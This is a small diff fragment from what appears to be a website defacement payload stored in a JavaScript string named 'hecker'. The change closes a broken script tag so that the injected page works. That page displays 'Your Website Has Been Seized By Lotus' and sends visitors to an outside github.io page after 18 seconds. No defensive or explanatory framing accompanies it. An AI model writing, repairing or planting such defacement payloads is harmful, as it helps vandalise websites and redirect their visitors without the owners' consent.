@@ -91,7 +91,7 @@ let hecker=`
          setTimeout(function(){
             window.location.href = 'https://lotus-xml.github.io/uwu.html';
          }, 18000);
-      </script
+      </script>
 <balls>
 <a>Your Website Has Been Seized By Lotus, Take The L!</a><p>
 </p>
